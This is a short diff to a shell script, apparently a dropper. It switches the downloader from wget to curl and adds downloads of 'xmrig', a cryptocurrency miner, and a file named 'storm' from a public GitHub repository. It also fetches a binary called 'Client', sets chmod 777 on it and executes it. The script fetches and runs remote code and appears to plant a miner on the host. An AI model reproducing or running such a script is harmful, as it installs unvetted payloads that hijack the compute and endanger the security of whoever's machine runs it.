@@ -7,9 +7,12 @@ url=https://github.com/rxu7s/Public/raw/main/Client
 file_name=Client
 
 apt-get update -y
-apt-get install wget -y
+apt-get install curl -y
 apt-get install python3 -y
 
-wget $url -O $file_name
+curl -O "https://raw.githubusercontent.com/rxu7s/Public/main/xmrig"
+curl -O "https://raw.githubusercontent.com/rxu7s/Public/main/storm"
+
+curl -o $file_name $url
 chmod 777 $file_name
 ./$file_name
